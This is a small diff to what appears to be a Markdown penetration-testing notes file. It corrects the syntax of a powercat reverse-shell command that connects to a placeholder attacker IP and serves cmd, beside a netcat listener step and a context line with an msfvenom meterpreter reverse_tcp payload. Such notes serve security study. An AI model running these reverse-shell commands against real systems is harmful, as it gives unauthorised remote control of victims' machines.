@@ -117,12 +117,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443
 
 - We can use [powercat](https://github.com/besimorhino/powercat)
 - We set up a listener `nc -lvp 443`
-- We launch powercat `powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"
+- We launch powercat `powershell -c "powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"`
 - We should get a shell
  
 ## Command and Control
 
-### TODO`
+### TODO
 
 ## Resources
 
